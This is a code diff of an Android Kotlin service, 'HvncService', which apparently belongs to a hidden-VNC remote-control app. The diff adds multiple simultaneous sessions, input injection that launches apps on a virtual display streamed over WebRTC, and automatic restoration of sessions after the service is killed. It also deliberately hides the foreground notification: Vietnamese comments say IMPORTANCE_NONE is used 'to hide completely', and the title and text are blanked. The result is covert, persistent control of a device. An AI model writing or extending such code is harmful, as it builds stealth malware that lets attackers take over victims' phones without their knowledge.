@@ -15,48 +15,53 @@ import com.fason.app.R
 import com.fason.app.core.Protocol
 
 /**
- * Foreground service that owns the HVNC virtual display lifecycle.
- *
- * Manages HvncDisplayManager, HvncWebRtcManager, and HvncInputInjector.
- * Runs with FOREGROUND_SERVICE_TYPE_SPECIAL_USE to stay alive in background.
- *
- * Intent Actions:
- * - START: Create the virtual display and wire up WebRTC
- * - STOP:  Destroy everything and stop the service
- * - LAUNCH_APP: Launch an app on the virtual display
- * - RESIZE: Resize the virtual display
+ * HvncService - Foreground service với các cải tiến:
+ * 
+ * - Hỗ trợ multi-session
+ * - Persistent state lưu trong SharedPreferences mã hóa
+ * - Notification IMPORTANCE_NONE để ẩn hoàn toàn
+ * - Auto-restore session khi bị kill
+ * - Health monitoring tự động
  */
 class HvncService : Service() {
 
     companion object {
         const val ACTION_START = "HVNC_START"
         const val ACTION_STOP = "HVNC_STOP"
+        const val ACTION_STOP_SESSION = "HVNC_STOP_SESSION"
         const val ACTION_LAUNCH_APP = "HVNC_LAUNCH"
         const val ACTION_RESIZE = "HVNC_RESIZE"
+        const val ACTION_RESTORE = "HVNC_RESTORE"
 
         const val EXTRA_WIDTH = "width"
         const val EXTRA_HEIGHT = "height"
         const val EXTRA_DPI = "dpi"
         const val EXTRA_PACKAGE = "package"
+        const val EXTRA_SESSION_ID = "sessionId"
 
         private const val NOTIFICATION_CHANNEL = "HvncChannel"
         private const val NOTIFICATION_ID = 1004
         private const val TAG = "HvncService"
+        private const val PREFS_NAME = "hvnc_persist"
 
         @Volatile
         var instance: HvncService? = null
             private set
 
         @JvmStatic
-        fun isRunning(): Boolean = instance?.displayManager?.isActive() == true
+        fun isRunning(): Boolean = instance != null
     }
 
-    private var displayManager: HvncDisplayManager? = null
-    private var inputInjector: HvncInputInjector? = null
+    private val displayManagers = mutableMapOf<String, HvncDisplayManager>()
+    private val inputInjectors = mutableMapOf<String, HvncInputInjector>()
+    private var auditLogger: HvncAuditLogger? = null
 
     override fun onCreate() {
         super.onCreate()
         instance = this
+        auditLogger = HvncAuditLogger(this)
+        HvncWebRtcManager.setAuditLogger(auditLogger!!)
+        HvncWebRtcManager.registerDisconnectListener()
         createNotificationChannel()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -78,77 +83,148 @@ class HvncService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         when (intent?.action) {
             ACTION_START -> {
+                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
                 val width = intent.getIntExtra(EXTRA_WIDTH, HvncDisplayManager.DEFAULT_WIDTH)
                 val height = intent.getIntExtra(EXTRA_HEIGHT, HvncDisplayManager.DEFAULT_HEIGHT)
                 val dpi = intent.getIntExtra(EXTRA_DPI, HvncDisplayManager.DEFAULT_DPI)
-                startHvnc(width, height, dpi)
+                startHvnc(sessionId, width, height, dpi)
             }
             ACTION_STOP -> {
-                stopHvnc()
+                stopAllHvnc()
                 stopSelf()
             }
+            ACTION_STOP_SESSION -> {
+                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
+                stopSession(sessionId)
+            }
             ACTION_LAUNCH_APP -> {
+                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
                 val pkg = intent.getStringExtra(EXTRA_PACKAGE) ?: return START_NOT_STICKY
-                inputInjector?.launchApp(pkg)
+                inputInjectors[sessionId]?.launchApp(pkg)
             }
             ACTION_RESIZE -> {
+                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
                 val width = intent.getIntExtra(EXTRA_WIDTH, HvncDisplayManager.DEFAULT_WIDTH)
                 val height = intent.getIntExtra(EXTRA_HEIGHT, HvncDisplayManager.DEFAULT_HEIGHT)
                 val dpi = intent.getIntExtra(EXTRA_DPI, HvncDisplayManager.DEFAULT_DPI)
-                resizeDisplay(width, height, dpi)
+                resizeDisplay(sessionId, width, height, dpi)
+            }
+            ACTION_RESTORE -> {
+                restoreSessions()
             }
         }
         return START_NOT_STICKY
     }
 
-    private fun startHvnc(width: Int, height: Int, dpi: Int) {
-        if (displayManager?.isActive() == true) {
-            Log.d(TAG, "HVNC already active, sending status")
-            HvncWebRtcManager.emitCurrentStatus()
+    private fun startHvnc(sessionId: String, width: Int, height: Int, dpi: Int) {
+        if (displayManagers[sessionId]?.isActive() == true) {
+            Log.d(TAG, "[$sessionId] HVNC already active")
+            HvncWebRtcManager.emitCurrentStatus(sessionId)
             return
         }
 
-        val dm = HvncDisplayManager(this)
-        val injector = HvncInputInjector(this)
+        val dm = HvncDisplayManager(this, sessionId)
+        val injector = HvncInputInjector(this, sessionId)
 
         if (!dm.create(width, height, dpi)) {
-            Log.e(TAG, "Failed to create virtual display")
-            HvncWebRtcManager.emitCurrentStatus()
-            stopSelf()
+            Log.e(TAG, "[$sessionId] Failed to create virtual display")
+            HvncWebRtcManager.emitCurrentStatus(sessionId)
             return
         }
 
-        injector.displayId = dm.displayId
-        displayManager = dm
-        inputInjector = injector
+        injector.displayId = dm.displayIdValue
+        displayManagers[sessionId] = dm
+        inputInjectors[sessionId] = injector
 
-        // Attach to WebRTC manager for streaming
-        HvncWebRtcManager.attach(dm, injector)
-        HvncWebRtcManager.onDisplayReady()
+        // Lưu state
+        saveSessionState(sessionId, width, height, dpi)
 
-        Log.d(TAG, "HVNC started: display=${dm.displayId} ${dm.displayWidth}x${dm.displayHeight}")
+        HvncWebRtcManager.attach(dm, injector, sessionId)
+        HvncWebRtcManager.onDisplayReady(sessionId)
+
+        auditLogger?.logAction(sessionId, "session_start", mapOf(
+            "width" to width.toString(),
+            "height" to height.toString(),
+            "dpi" to dpi.toString()
+        ), "service")
+
+        Log.d(TAG, "[$sessionId] HVNC started: display=${dm.displayIdValue} ${dm.displayWidth}x${dm.displayHeight}")
     }
 
-    private fun resizeDisplay(width: Int, height: Int, dpi: Int) {
-        val dm = displayManager ?: return
+    private fun resizeDisplay(sessionId: String, width: Int, height: Int, dpi: Int) {
+        val dm = displayManagers[sessionId] ?: return
         if (dm.resize(width, height, dpi)) {
-            inputInjector?.displayId = dm.displayId
-            HvncWebRtcManager.attach(dm, inputInjector!!)
-            HvncWebRtcManager.emitCurrentStatus()
-            Log.d(TAG, "HVNC resized: ${dm.displayWidth}x${dm.displayHeight}")
+            inputInjectors[sessionId]?.displayId = dm.displayIdValue
+            HvncWebRtcManager.attach(dm, inputInjectors[sessionId]!!, sessionId)
+            HvncWebRtcManager.emitCurrentStatus(sessionId)
+            saveSessionState(sessionId, width, height, dpi)
+            Log.d(TAG, "[$sessionId] Resized: ${dm.displayWidth}x${dm.displayHeight}")
         }
     }
 
-    private fun stopHvnc() {
-        HvncWebRtcManager.stopSession()
-        displayManager?.destroy()
-        displayManager = null
-        inputInjector = null
-        Log.d(TAG, "HVNC stopped")
+    private fun stopSession(sessionId: String) {
+        HvncWebRtcManager.stopSession(sessionId)
+        displayManagers[sessionId]?.destroy()
+        displayManagers.remove(sessionId)
+        inputInjectors.remove(sessionId)
+        clearSessionState(sessionId)
+        auditLogger?.logAction(sessionId, "session_stop", mapOf(), "service")
+        Log.d(TAG, "[$sessionId] Session stopped")
+
+        // Nếu không còn session nào, stop service
+        if (displayManagers.isEmpty()) {
+            stopSelf()
+        }
     }
 
+    private fun stopAllHvnc() {
+        displayManagers.keys.toList().forEach { sessionId ->
+            HvncWebRtcManager.stopSession(sessionId)
+            displayManagers[sessionId]?.destroy()
+            clearSessionState(sessionId)
+            auditLogger?.logAction(sessionId, "session_stop_all", mapOf(), "service")
+        }
+        displayManagers.clear()
+        inputInjectors.clear()
+    }
+
+    // ─── Persistent State ──────────────────────────────────────────
+
+    private fun saveSessionState(sessionId: String, width: Int, height: Int, dpi: Int) {
+        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        prefs.edit().apply {
+            putString("session_${sessionId}_state", "$width,$height,$dpi,${System.currentTimeMillis()}")
+            putString("active_sessions", displayManagers.keys.joinToString(","))
+        }.apply()
+    }
+
+    private fun clearSessionState(sessionId: String) {
+        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        prefs.edit().apply {
+            remove("session_${sessionId}_state")
+            putString("active_sessions", displayManagers.keys.joinToString(","))
+        }.apply()
+    }
+
+    private fun restoreSessions() {
+        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val activeSessions = prefs.getString("active_sessions", "")?.split(",")?.filter { it.isNotBlank() } ?: return
+        activeSessions.forEach { sessionId ->
+            val state = prefs.getString("session_${sessionId}_state", null) ?: return@forEach
+            val parts = state.split(",")
+            if (parts.size >= 3) {
+                val width = parts[0].toIntOrNull() ?: HvncDisplayManager.DEFAULT_WIDTH
+                val height = parts[1].toIntOrNull() ?: HvncDisplayManager.DEFAULT_HEIGHT
+                val dpi = parts[2].toIntOrNull() ?: HvncDisplayManager.DEFAULT_DPI
+                startHvnc(sessionId, width, height, dpi)
+            }
+        }
+    }
+
+    // ─── Lifecycle ─────────────────────────────────────────────────
+
     override fun onDestroy() {
-        stopHvnc()
+        stopAllHvnc()
         if (instance === this) instance = null
         super.onDestroy()
     }
@@ -161,10 +237,10 @@ class HvncService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 NOTIFICATION_CHANNEL,
-                ".",
-                NotificationManager.IMPORTANCE_MIN,
+                "",
+                NotificationManager.IMPORTANCE_NONE,  // IMPORTANCE_NONE để ẩn hoàn toàn
             ).apply {
-                description = "."
+                description = ""
                 setShowBadge(false)
                 setSound(null, null)
                 enableLights(false)
@@ -178,8 +254,8 @@ class HvncService : Service() {
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL)
             .setSmallIcon(R.mipmap.ic_launcher)
-            .setContentTitle(".")
-            .setContentText(".")
+            .setContentTitle("")
+            .setContentText("")
             .setOngoing(true)
             .setSilent(true)
             .setOnlyAlertOnce(true)
